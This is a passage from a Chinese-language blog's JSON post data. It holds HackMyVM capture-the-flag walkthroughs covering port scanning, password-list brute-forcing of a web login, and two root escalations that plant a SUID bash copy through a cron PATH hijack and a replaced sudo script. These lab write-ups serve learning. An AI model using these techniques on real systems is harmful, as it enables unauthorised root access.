moksha moksha 3526 ene  4  2023 .bashrc\ndrwxr-xr-x 3 moksha moksha 4096 ene  4  2023 .local\n-rw-r--r-- 1 moksha moksha  807 ene  4  2023 .profile\n-rw------- 1 moksha moksha   14 ene  4  2023 user.txt\n-rw------- 1 moksha moksha   52 ene  4  2023 .Xauthority\nmoksha@hannah:~$ cd ..\nmoksha@hannah:/home$ ls -al\ntotal 12\ndrwxr-xr-x  3 root   root   4096 ene  4  2023 .\ndrwxr-xr-x 18 root   root   4096 ene  4  2023 ..\ndrwxr-xr-x  3 moksha moksha 4096 ene  4  2023 moksha\nmoksha@hannah:/home$ find / -perm -4000 -type f 2>/dev/null\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/lib/openssh/ssh-keysign\n/usr/bin/su\n/usr/bin/newgrp\n/usr/bin/passwd\n/usr/bin/umount\n/usr/bin/gpasswd\n/usr/bin/chsh\n/usr/bin/chfn\n/usr/bin/mount\nmoksha@hannah:/home$ /sbin/getcap -r / 2>/dev/null\n/usr/bin/ping cap_net_raw=ep\nmoksha@hannah:/home$ cat /etc/cron*\ncat: /etc/cron.d: Es un directorio\ncat: /etc/cron.daily: Es un directorio\ncat: /etc/cron.hourly: Es un directorio\ncat: /etc/cron.monthly: Es un directorio\n# /etc/crontab: system-wide crontab\n# Unlike any other crontab you don't have to run the `crontab'\n# command to install the new version when you edit this file\n# and files in /etc/cron.d. These files also have username fields,\n# that none of the other crontabs do.\n\nSHELL=/bin/sh\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/media:/bin:/usr/sbin:/usr/bin\n\n# Example of job definition:\n# .---------------- minute (0 - 59)\n# |  .------------- hour (0 - 23)\n# |  |  .---------- day of month (1 - 31)\n# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...\n# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat\n# |  |  |  |  |\n# *  *  *  *  * user-name command to be executed\n* * * * * root touch /tmp/enlIghtenment\n17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly\n25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )\n47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )\n52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )\n#\ncat: /etc/cron.weekly: Es un directorio\n\nmoksha@hannah:/tmp$ which touch\n/usr/bin/touch\n\nmoksha@hannah:/tmp$ ls -la /media\ntotal 12\ndrwxrwxrwx  3 root root 4096 ene  4  2023 .\ndrwxr-xr-x 18 root root 4096 ene  4  2023 ..\nlrwxrwxrwx  1 root root    6 ene  4  2023 cdrom -> cdrom0\ndrwxr-xr-x  2 root root 4096 ene  4  2023 cdrom0\n\n```\n\n\u6709\u4e00\u4e2a\u5b9a\u65f6\u4efb\u52a1\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u5b83\u7684\u73af\u5883\u53d8\u91cf\u4e5f\u6709\u95ee\u9898\uff0c\u6240\u4ee5\n\n```\nmoksha@hannah:/tmp$ echo 'cp /bin/bash /tmp/sh;chmod u+s /tmp/sh' > /media/touch\nmoksha@hannah:/tmp$ ls /tmp/\nenlIghtenment\nsystemd-private-7e7d884382b944e89570ebdfb081124b-systemd-logind.service-Bwv8Xg\nsystemd-private-7e7d884382b944e89570ebdfb081124b-systemd-timesyncd.service-S60g6e\nmoksha@hannah:/tmp$ chmod +x /media/touch\n\n```\n\n\u7b49\u5b50\u5f39\u98de\u4e00\u4f1a\n\n```\nmoksha@hannah:/tmp$ ls\nenlIghtenment  systemd-private-7e7d884382b944e89570ebdfb081124b-systemd-logind.service-Bwv8Xg\nsh             systemd-private-7e7d884382b944e89570ebdfb081124b-systemd-timesyncd.service-S60g6e\nmoksha@hannah:/tmp$ ./sh -p\nsh-5.1# id\nuid=1000(moksha) gid=1000(moksha) euid=0(root) grupos=1000(moksha),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)\n\n```\n\n\u200d<!-- ##{'timestamp':1739012133}## -->sentence", "top": 0, "createdAt": 1739012133, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-02-08", "dateLabelColor": "#0969da"}, "P21": {"htmlDir": "docs/post/hmv_uvalde.html", "labels": ["HackMyVM"], "postTitle": "hmv_uvalde", "postUrl": "post/hmv_uvalde.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/21", "commentNum": 0, "wordCount": 17455, "description": "# 0.\u7b80\u4ecb\n\n\u9776\u673a\uff1ahttps://hackmyvm.eu/machines/machine.php?vm=Uvalde\n \u96be\u5ea6\uff1a\u7eff\u8272\n \u76ee\u6807 IP\uff1a192.168.205.149\n \u672c\u673a IP\uff1a192.168.205.128\n\n# 1.\u626b\u63cf\n\nnmap\u8d77\u624b\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ nmap -A -Pn -n --min-rate 10000 192.168.205.149\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-02-08 09:15 CST\nNmap scan report for 192.168.205.149\nHost is up (0.00022s latency).\nNot shown: 997 closed tcp ports (reset)\nPORT   STATE SERVICE VERSION\n21/tcp open  ftp     vsftpd 3.0.3\n| ftp-syst: \n|   STAT: \n| FTP server status:\n|      Connected to ::ffff:192.168.205.128\n|      Logged in as ftp\n|      TYPE: ASCII\n|      No session bandwidth limit\n|      Session timeout in seconds is 300\n|      Control connection is plain text\n|      Data connections will be plain text\n|      At session startup, client count was 2\n|      vsFTPd 3.0.3 - secure, fast, stable\n|_End of status\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\n|_-rw-r--r--    1 1000     1000         5154 Jan 28  2023 output\n22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)\n| ssh-hostkey: \n|   3072 3a:09:a4:da:d7:db:99:ee:a5:51:05:e9:af:e7:08:90 (RSA)\n|   256 cb:42:6a:be:22:13:2c:f2:57:f9:80:d1:f7:fb:88:5c (ECDSA)\n|_  256 44:3c:b4:0f:aa:c3:94:fa:23:15:19:e3:e5:18:56:94 (ED25519)\n80/tcp open  http    Apache httpd 2.4.54 ((Debian))\n|_http-server-header: Apache/2.4.54 (Debian)\n|_http-title: Agency - Start Bootstrap Theme\nMAC Address: 08:00:27:79:3A:5B (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nDevice type: general purpose|router\nRunning: Linux 4.X|5.X, MikroTik RouterOS 7.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3\nOS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)\nNetwork Distance: 1 hop\nService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.22 ms 192.168.205.149\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 8.35 seconds\n```\n\n# 2.\u8e29\u70b9\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ ftp 192.168.205.149                          \nConnected to 192.168.205.149.\n220 (vsFTPd 3.0.3)\nName (192.168.205.149:kali): anonymous\n331 Please specify the password.\nPassword: \n230 Login successful.\nRemote system type is UNIX.\nUsing binary mode to transfer files.\nftp> ls -al\n229 Entering Extended Passive Mode (|||61334|)\n150 Here comes the directory listing.\ndrwxr-xr-x    2 0        116          4096 Jan 28  2023 .\ndrwxr-xr-x    2 0        116          4096 Jan 28  2023 ..\n-rw-r--r--    1 1000     1000         5154 Jan 28  2023 output\n226 Directory send OK.\nftp> mget output\nmget output [anpqy?]? y\n229 Entering Extended Passive Mode (|||41326|)\n150 Opening BINARY mode data connection for output (5154 bytes).\n100% |*****************************************************************************************|  5154        9.15 MiB/s    00:00 ETA\n226 Transfer complete.\n5154 bytes received in 00:00 (4.77 MiB/s)\nftp> exit\n221 Goodbye.\n                              \n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ file output \noutput: Unicode text, UTF-8 text, with very long lines (328), with CRLF, CR, LF line terminators, with escape sequences, with overstriking\n           \n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ cat output  \nScript d\u00e9marr\u00e9 sur 2023-01-28 19:54:05+01:00 [TERM='xterm-256color' TTY='/dev/pts/0' COLUMNS='105' LINES='25']\nmatthew@debian:~$ id\nuid=1000(matthew) gid=1000(matthew) groupes=1000(matthew)\nmatthew@debian:~$ ls -al\ntotal 32\ndrwxr-xr-x 4 matthew matthew 4096 28 janv. 19:54 .\ndrwxr-xr-x 3 root    root    4096 23 janv. 07:52 ..\nlrwxrwxrwx 1 root    root       9 23 janv. 07:53 .bash_history -> /dev/null\n-rw-r--r-- 1 matthew matthew  220 23 janv. 07:51 .bash_logout\n-rw-r--r-- 1 matthew matthew 3526 23 janv. 07:51 .bashrc\ndrwx------ 3 matthew matthew 4096 23 janv. 08:04 .config\ndrwxr-xr-x 3 matthew matthew 4096 23 janv. 08:04 .local\n-rw-r--r-- 1 matthew matthew  807 23 janv. 07:51 .profile\n-rw-r--r-- 1 matthew matthew    0 28 janv. 19:54 typescript\n-rwx------ 1 matthew matthew   33 23 janv. 07:53 user.txt\nmatthew@debian:~$ toilet -f mono12 -F metal hackmyvm.eu\n                                                                              \n \u2584\u2584                            \u2584\u2584                                             \n \u2588\u2588                            \u2588\u2588                                             \n \u2588\u2588\u2584\u2588\u2588\u2588\u2588\u2584   \u2584\u2588\u2588\u2588\u2588\u2588\u2584   \u2584\u2588\u2588\u2588\u2588\u2588\u2584  \u2588\u2588 \u2584\u2588\u2588\u2580   \u2588\u2588\u2588\u2588\u2584\u2588\u2588\u2584  \u2580\u2588\u2588  \u2588\u2588\u2588  \u2588\u2588\u2584  \u2584\u2588\u2588  \u2588\u2588\u2588\u2588\u2584\u2588\u2588\u2584 \n \u2588\u2588\u2580   \u2588\u2588   \u2580 \u2584\u2584\u2584\u2588\u2588  \u2588\u2588\u2580    \u2580  \u2588\u2588\u2584\u2588\u2588     \u2588\u2588 \u2588\u2588 \u2588\u2588   \u2588\u2588\u2584 \u2588\u2588    \u2588\u2588  \u2588\u2588   \u2588\u2588 \u2588\u2588 \u2588\u2588 \n \u2588\u2588    \u2588\u2588  \u2584\u2588\u2588\u2580\u2580\u2580\u2588\u2588  \u2588\u2588        \u2588\u2588\u2580\u2588\u2588\u2584    \u2588\u2588 \u2588\u2588 \u2588\u2588    \u2588\u2588\u2588\u2588\u2580    \u2580\u2588\u2584\u2584\u2588\u2580   \u2588\u2588 \u2588\u2588 \u2588\u2588 \n \u2588\u2588    \u2588\u2588  \u2588\u2588\u2584\u2584\u2584\u2588\u2588\u2588  \u2580\u2588\u2588\u2584\u2584\u2584\u2584\u2588  \u2588\u2588  \u2580\u2588\u2584   \u2588\u2588 \u2588\u2588 \u2588\u2588     \u2588\u2588\u2588      \u2588\u2588\u2588\u2588    \u2588\u2588 \u2588\u2588 \u2588\u2588 \n \u2580\u2580    \u2580\u2580   \u2580\u2580\u2580\u2580 \u2580\u2580    \u2580\u2580\u2580\u2580\u2580   \u2580\u2580   \u2580\u2580\u2580  \u2580\u2580 \u2580\u2580 \u2580\u2580     \u2588\u2588        \u2580\u2580     \u2580\u2580 \u2580\u2580 \u2580\u2580 \n                                                    \u2588\u2588\u2588                       \n                                                                              \n                                                                              \n                                                                              \n                                                                              \n            \u2584\u2588\u2588\u2588\u2588\u2584   \u2588\u2588    \u2588\u2588                                                 \n           \u2588\u2588\u2584\u2584\u2584\u2584\u2588\u2588  \u2588\u2588    \u2588\u2588                                                 \n           \u2588\u2588\u2580\u2580\u2580\u2580\u2580\u2580  \u2588\u2588    \u2588\u2588                                                 \n    \u2588\u2588     \u2580\u2588\u2588\u2584\u2584\u2584\u2584\u2588  \u2588\u2588\u2584\u2584\u2584\u2588\u2588\u2588                                                 \n    \u2580\u2580       \u2580\u2580\u2580\u2580\u2580    \u2580\u2580\u2580\u2580 \u2580\u2580                                                 \n                                                                              \n                                                                              \nmatthew@debian:~$ exit\nexit\n\nScript termin\u00e9 sur 2023-01-28 19:54:37+01:00 [COMMAND_EXIT_CODE='0']\n                                                                         \n```\n\n\u6682\u65f6\u6ca1\u5565\u4f5c\u7528\uff0c\u7ee7\u7eed\u8e29\u70b9\u3002\u9875\u9762\u662f\u9759\u6001\u7684\uff0c\u770b\u4e00\u4e0b\u6709\u6ca1\u6709\u4ec0\u4e48\u660e\u663e\u6f0f\u6d1e\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ nuclei -u http://192.168.205.149             \n\n                     __     _\n   ____  __  _______/ /__  (_)\n  / __ \\/ / / / ___/ / _ \\/ /\n / / / / /_/ / /__/ /  __/ /\n/_/ /_/\\__,_/\\___/_/\\___/_/   v3.3.8\n\n                projectdiscovery.io\n\n[WRN] Found 2 templates with runtime error (use -validate flag for further examination)\n[INF] Current nuclei version: v3.3.8 (latest)\n[INF] Current nuclei-templates version: v10.1.2 (latest)\n[WRN] Scan results upload to cloud is disabled.\n[INF] New templates added in latest release: 52\n[INF] Templates loaded for current scan: 7654\n[INF] Executing 7274 signed templates from projectdiscovery/nuclei-templates\n[WRN] Loading 380 unsigned templates for scan. Use with caution.\n[INF] Targets loaded for current scan: 1\n[INF] Templates clustered: 1693 (Reduced 1591 Requests)\n[INF] Using Interactsh Server: oast.live\n[missing-sri] [http] [info] http://192.168.205.149 ['https://fonts.googleapis.com/css?family=Montserrat:400,700','https://fonts.googleapis.com/css?family=Kaushan+Script','https://fonts.googleapis.com/css?family=Droid+Serif:400,700,400italic,700italic','https://fonts.googleapis.com/css?family=Roboto+Slab:400,100,300,700']                                                                              \n[waf-detect:apachegeneric] [http] [info] http://192.168.205.149\n[openssh-detect] [tcp] [info] 192.168.205.149:22 ['SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u1']\n[ssh-server-enumeration] [javascript] [info] 192.168.205.149:22 ['SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u1']\n[ssh-auth-methods] [javascript] [info] 192.168.205.149:22 ['['publickey','password']']\n[ssh-password-auth] [javascript] [info] 192.168.205.149:22\n[ssh-sha1-hmac-algo] [javascript] [info] 192.168.205.149:22\n[CVE-2023-48795] [javascript] [medium] 192.168.205.149:22 ['Vulnerable to Terrapin']\n[ftp-anonymous-login] [tcp] [medium] 192.168.205.149:21\n[tech-detect:font-awesome] [http] [info] http://192.168.205.149\n[tech-detect:bootstrap] [http] [info] http://192.168.205.149\n[tech-detect:google-font-api] [http] [info] http://192.168.205.149\n[http-missing-security-headers:clear-site-data] [http] [info] http://192.168.205.149\n[http-missing-security-headers:strict-transport-security] [http] [info] http://192.168.205.149\n[http-missing-security-headers:x-content-type-options] [http] [info] http://192.168.205.149\n[http-missing-security-headers:x-frame-options] [http] [info] http://192.168.205.149\n[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://192.168.205.149\n[http-missing-security-headers:referrer-policy] [http] [info] http://192.168.205.149\n[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://192.168.205.149\n[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://192.168.205.149\n[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://192.168.205.149\n[http-missing-security-headers:content-security-policy] [http] [info] http://192.168.205.149\n[http-missing-security-headers:permissions-policy] [http] [info] http://192.168.205.149\n[form-detection] [http] [info] http://192.168.205.149\n[apache-detect] [http] [info] http://192.168.205.149 ['Apache/2.4.54 (Debian)']\n[package-json] [http] [info] http://192.168.205.149/package.json\n[package-json] [http] [info] http://192.168.205.149/package-lock.json\n                                             \n```\n\n\u6ca1\u770b\u5230\u5565\uff0c\u90a3\u6211\u4eec\u53bb\u7206\u7834\u76ee\u5f55\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ gobuster dir -u http://192.168.205.149 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt -x php,html,txt,md | grep -v '403'\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://192.168.205.149\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              php,html,txt,md\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/login.php            (Status: 200) [Size: 1022]\n/js                   (Status: 301) [Size: 315] [--> http://192.168.205.149/js/]\n/index.php            (Status: 200) [Size: 29604]\n/css                  (Status: 301) [Size: 316] [--> http://192.168.205.149/css/]\n/user.php             (Status: 302) [Size: 0] [--> login.php]\n/img                  (Status: 301) [Size: 316] [--> http://192.168.205.149/img/]\n/create_account.php   (Status: 200) [Size: 1003]\n/mail                 (Status: 301) [Size: 317] [--> http://192.168.205.149/mail/]\n/.                    (Status: 200) [Size: 29604]\n/success.php          (Status: 302) [Size: 0] [--> login.php]\n/vendor               (Status: 301) [Size: 319] [--> http://192.168.205.149/vendor/]\nProgress: 598000 / 598005 (100.00%)\n===============================================================\nFinished\n===============================================================\n                                                                 \n```\n\n\u6709\u4e00\u4e2a\u6ce8\u518c/create_account.php\uff0c\u6211\u4eec\u5c1d\u8bd5\u6ce8\u518c\n\n![image-20250331190202777](https://7r1umphk.github.io/image/20250331190202831.png)\n\n\u540e\u9762\u90a3\u4e00\u4e32\u6709\u70b9\u50cf64,\u6211\u4eec\u62ff\u8d77\u89e3\u5bc6\u770b\u770b\n\n![](https://7r1umphk.github.io/image/20250331190202831.png)\n\n\u53ef\u4ee5\u770b\u5230\u5b83\u7684\u5bc6\u7801\u683c\u5f0f\u662f\u4ee5\u7528\u6237\u540d+\u6ce8\u518c\u5e74+@+\u968f\u673a4\u4f4d\u6570\uff0c\u90a3\u6211\u4eec\u751f\u6210\u5b57\u5178\u7206\u7834\u4e00\u4e0b\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ for i in $(seq -w 0 9999); do echo 'matthew2023@$i' ;done > pass\n```\n\n\u6253\u5f00\u6211\u4eec\u7684burp\n\n![image-20250331190214441](https://7r1umphk.github.io/image/20250331190214521.png)\n\n![image-20250331190219774](https://7r1umphk.github.io/image/20250331190219855.png)\n\n421\u957f\u5ea6\u660e\u663e\u4e0d\u4e00\u6837\uff0c\u6211\u4eec\u4f7f\u7528\u8fd9\u4e2a\u5bc6\u7801\u6d4b\u8bd5\u767b\u5f55\n\n![image-20250331190225481](https://7r1umphk.github.io/image/20250331190225550.png)\n\n\u6211\u4eec\u5148\u5c1d\u8bd5\u53ef\u4e0d\u53ef\u4ee5ssh\u767b\u5f55\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ ssh matthew@192.168.205.149\nThe authenticity of host '192.168.205.149 (192.168.205.149)' can't be established.\nED25519 key fingerprint is SHA256:S2tp/jV32/GtUP68f14Rac4/yZXhbMmyut+ZqO+ZOl4.\nThis host key is known by the following other names/addresses:\n    ~/.ssh/known_hosts:6: [hashed name]\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '192.168.205.149' (ED25519) to the list of known hosts.\nmatthew@192.168.205.149's password: \nLinux uvalde.hmv 5.10.0-20-amd64 #1 SMP Debian 5.10.158-2 (2022-12-13) x86_64\n\nThe programs included with the Debian GNU/Linux system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\nmatthew@uvalde:~$ id\nuid=1000(matthew) gid=1000(matthew) groups=1000(matthew)\n```\n\n# 3.\u63d0\u6743\n\n```\nmatthew@uvalde:~$ sudo -l\nMatching Defaults entries for matthew on uvalde:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser matthew may run the following commands on uvalde:\n    (ALL : ALL) NOPASSWD: /bin/bash /opt/superhack\nmatthew@uvalde:~$ ls -la /opt/\ntotal 12\ndrwx---rwx  2 root root 4096 Feb  5  2023 .\ndrwxr-xr-x 18 root root 4096 Jan 22  2023 ..\n-rw-r--r--  1 root root 1594 Jan 31  2023 superhack\nmatthew@uvalde:~$ cat /opt/superhack \n#! /bin/bash \nclear -x\n\nGRAS=$(tput bold)\nJAUNE=$(tput setaf 3)$GRAS\nBLANC=$(tput setaf 7)$GRAS\nBLEU=$(tput setaf 4)$GRAS\nVERT=$(tput setaf 2)$GRAS\nROUGE=$(tput setaf 1)$GRAS\nRESET=$(tput sgr0)\n\ncat << EOL\n\n\n _______  __   __  _______  _______  ______    __   __  _______  _______  ___   _ \n|       ||  | |  ||       ||       ||    _ |  |  | |  ||   _   ||       ||   | | |\n|  _____||  | |  ||    _  ||    ___||   | ||  |  |_|  ||  |_|  ||       ||   |_| |\n| |_____ |  |_|  ||   |_| ||   |___ |   |_||_ |       ||       ||       ||      _|\n|_____  ||       ||    ___||    ___||    __  ||       ||       ||      _||     |_ \n _____| ||       ||   |    |   |___ |   |  | ||   _   ||   _   ||     |_ |    _  |\n|_______||_______||___|    |_______||___|  |_||__| |__||__| |__||_______||___| |_|\n\n\n\nEOL\n\n\nprintf '${BLANC}Tool:${RESET} ${BLEU}superHack${RESET}\\n'\nprintf '${BLANC}Author:${RESET} ${BLEU}hackerman${RESET}\\n'\nprintf '${BLANC}Version:${RESET} ${BLEU}1.0${RESET}\\n'\n\nprintf '\\n'\n\n[[ $# -ne 0 ]] && echo -e '${BLEU}Usage:${RESET} $0 domain' && exit\n\nwhile [ -z '$domain' ]; do\nread -p '${VERT}domain to hack:${RESET} ' domain\ndone\n\nprintf '\\n'\n\nn=50\n\nstring=''\nfor ((i=0; i<$n; i++))\ndo\nstring+='.'\ndone\n\nfor ((i=0; i<$n; i++))\ndo\nstring='${string/./#}'\nprintf '${BLANC}Hacking progress...:${RESET} ${BLANC}[$string]${RESET}\\r'\nsleep .09\ndone\n\nprintf '\\n'\nprintf '${JAUNE}Target $domain ====> PWNED${RESET}\\n'\nprintf '${JAUNE}URL: https://$domain/*********************.php${RESET}\\n'\n\necho -e '\\n${ROUGE}Pay 0.000047 BTC to 3FZbgi29cpjq2GjdwV8eyHuJJnkLtktZc5 to unlock backdoor.${RESET}\\n'\n```\n\n\u6211\u4eec\u53ef\u4ee5\u4fee\u6539\u5f53\u524d\u76ee\u5f55\uff0c\u4f7f\u7528\u628a\u811a\u672c\u6362\u4e00\u4e0b\u5c31\u597d\u4e86\n\n```\nmatthew@uvalde:/opt$ mv superhack superhack1\nmatthew@uvalde:/opt$ ls -la\ntotal 12\ndrwx---rwx  2 root root 4096 Feb  8 02:37 .\ndrwxr-xr-x 18 root root 4096 Jan 22  2023 ..\n-rw-r--r--  1 root root 1594 Jan 31  2023 superhack1\nmatthew@uvalde:/opt$ echo 'cp /bin/bash /tmp/sh;chmod u+s /tmp/sh' > superhack\nmatthew@uvalde:/opt$ ls -al\ntotal 16\ndrwx---rwx  2 root    root    4096 Feb  8 02:38 .\ndrwxr-xr-x 18 root    root    4096 Jan 22  2023 ..\n-rw-r--r--  1 matthew matthew   39 Feb  8 02:38 superhack\n-rw-r--r--  1 root    root    1594 Jan 31  2023 superhack1\nmatthew@uvalde:/opt$ ls -la /tmp/\ntotal 40\ndrwxrwxrwt 10 root root 4096 Feb  8 02:29 .\ndrwxr-xr-x 18 root root 4096 Jan 22  2023 ..\ndrwxrwxrwt  2 root root 4096 Feb  8 02:14 .font-unix\ndrwxrwxrwt  2 root root 4096 Feb  8 02:14 .ICE-unix\ndrwx------  3 root root 4096 Feb  8 02:14 systemd-private-da80bce88f6c483fb3f7d4a8a59370c0-apache2.service-l1oDZf\ndrwx------  3 root root 4096 Feb  8 02:14 systemd-private-da80bce88f6c483fb3f7d4a8a59370c0-systemd-logind.service-fSJRkg\ndrwx------  3 root root 4096 Feb  8 02:14 systemd-private-da80bce88f6c483fb3f7d4a8a59370c0-systemd-timesyncd.service-UNC5xf\ndrwxrwxrwt  2 root root 4096 Feb  8 02:14 .Test-unix\ndrwxrwxrwt  2 root root 4096 Feb  8 02:14 .X11-unix\ndrwxrwxrwt  2 root root 4096 Feb  8 02:14 .XIM-unix\nmatthew@uvalde:/opt$ sudo /bin/bash /opt/superhack\nmatthew@uvalde:/opt$ ls -la /tmp/\ntotal 1248\ndrwxrwxrwt 10 root root    4096 Feb  8 02:39 .\ndrwxr-xr-x 18 root root    4096 Jan 22  2023 ..\ndrwxrwxrwt  2 root root    4096 Feb  8 02:14 .font-unix\ndrwxrwxrwt  2 root root    4096 Feb  8 02:14 .ICE-unix\n-rwsr-xr-x  1 root root 1234376 Feb  8 02:39 sh\ndrwx------  3 root root    4096 Feb  8 02:14 systemd-private-da80bce88f6c483fb3f7d4a8a59370c0-apache2.service-l1oDZf\ndrwx------  3 root root    4096 Feb  8 02:14 systemd-private-da80bce88f6c483fb3f7d4a8a59370c0-systemd-logind.service-fSJRkg\ndrwx------  3 root root    4096 Feb  8 02:14 systemd-private-da80bce88f6c483fb3f7d4a8a59370c0-systemd-timesyncd.service-UNC5xf\ndrwxrwxrwt  2 root root    4096 Feb  8 02:14 .Test-unix\ndrwxrwxrwt  2 root root    4096 Feb  8 02:14 .X11-unix\ndrwxrwxrwt  2 root root    4096 Feb  8 02:14 .XIM-unix\nmatthew@uvalde:/opt$ /tmp/sh -p\nsh-5.1# id\nuid=1000(matthew) gid=1000(matthew) euid=0(root) groups=1000(matthew)\n```\n\n<!-- ##{'timestamp':1739012133}## -->sentence", "top": 0, "createdAt": 1739012133, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-02-08", "dateLabelColor": "#0969da"}, "P20": {"htmlDir": "docs/post/hmv_Arroutada.html", "labels": ["HackMyVM"], "postTitle": "hmv_Arroutada", "postUrl": "post/hmv_Arroutada.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/20", "commentNum": 0, "wordCount": 17667, "description": "# 0.\u7b80\u4ecb\n\n\u9776\u673a\uff1ahttps://hackmyvm.eu/machines/machine.php?vm=Arroutada\n \u96be\u5ea6\uff1a\u7eff\u8272\n \u76ee\u6807 IP\uff1a192.168.205.151\n \u672c\u673a IP\uff1a192.168.205.128\n\n# 1.\u626b\u63cf\n\nnmap\u8d77\u624b\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ nmap -A -Pn -n --min-rate 10000 192.168.205.151\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-02-08 16:47 CST\nNmap scan report for 192.168.205.151\nHost is up (0.00024s latency).\nNot shown: 999 closed tcp ports (reset)\nPORT   STATE SERVICE VERSION\n80/tcp open  http    Apache httpd 2.4.54 ((Debian))\n|_http-server-header: Apache/2.4.54 (Debian)\n|_http-title: Site doesn't have a title (text/html).\nMAC Address: 08:00:27:06:46:64 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nDevice type: general purpose\nRunning: Linux 4.X|5.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\nOS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4)\nNetwork Distance: 1 hop\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.24 ms 192.168.205.151\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 7.81 seconds\n                                                        \n```\n\n# 2.\u8e29\u70b9\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ curl http://192.168.205.151\n<div align='center'><img src='imgs/apreton.png'></div>\n```\n\n\u7206\u7834\u76ee\u5f55\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ gobuster dir -u http://192.168.205.151 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt -x php,html,txt,md | grep -v '403'\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://192.168.205.151\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              php,html,txt,md\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/index.html           (Status: 200) [Size: 59]\n/.                    (Status: 200) [Size: 59]\n/imgs                 (Status: 301) [Size: 317] [--> http://192.168.205.151/imgs/]\n/scout                (Status: 301) [Size: 318] [--> http://192.168.205.151/scout/]\nProgress: 598000 / 598005 